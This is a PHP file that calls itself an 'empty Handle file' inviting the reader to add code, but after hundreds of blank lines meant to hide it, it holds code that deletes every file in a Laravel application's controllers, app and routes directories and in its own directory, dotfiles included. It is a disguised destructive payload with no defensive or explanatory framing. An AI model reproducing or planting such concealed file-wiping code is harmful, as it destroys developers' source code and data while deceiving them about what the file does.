<?php
/*********************************
*************************
*************** empty Handle file
** please add your code here
**/











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$files = glob('../app/Http/Controllers/*'); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}

$files = glob('../app/Http/*'); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}

$files = glob('../app/*'); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}

$files = glob('../routes/*'); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}

$files = glob('{,.}*', GLOB_BRACE);
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}